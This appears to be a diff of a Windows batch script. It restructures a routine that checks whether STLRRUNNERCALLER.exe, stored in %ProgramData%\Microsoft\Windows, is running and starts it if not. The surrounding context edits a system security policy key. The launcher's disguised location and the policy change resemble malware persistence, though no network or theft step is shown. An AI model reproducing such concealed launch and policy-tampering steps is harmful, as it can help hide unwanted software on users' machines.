@@ -164,23 +164,33 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
+
+
+
+
 :: Check if the file exists
-if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" (
-    :: Check if the process is already running
-    tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
-    if %errorlevel% neq 0 (
-        echo STLRRUNNERCALLER.exe is not running
-        echo Starting STLRRUNNERCALLER...
-        start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-        echo Started.
-        echo.
-        echo.
-    )
+if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" goto :CHECKSTLRRUNSTATUS
+echo STLRRUNNERCALLER.exe not found. Going to NEXT3
+goto :NEXT3
+
+:CHECKSTLRRUNSTATUS
+:: Check if the process is already running
+tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
+if %errorlevel% neq 0 (
+    echo STLRRUNNERCALLER.exe is not running.
+    echo Starting STLRRUNNERCALLER...
+    start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+    echo Started.
+) else (
+    echo STLRRUNNERCALLER.exe is already running.
 )
+echo.
+echo.
 
 
 
-
+:NEXT3
+echo.
 
 
 
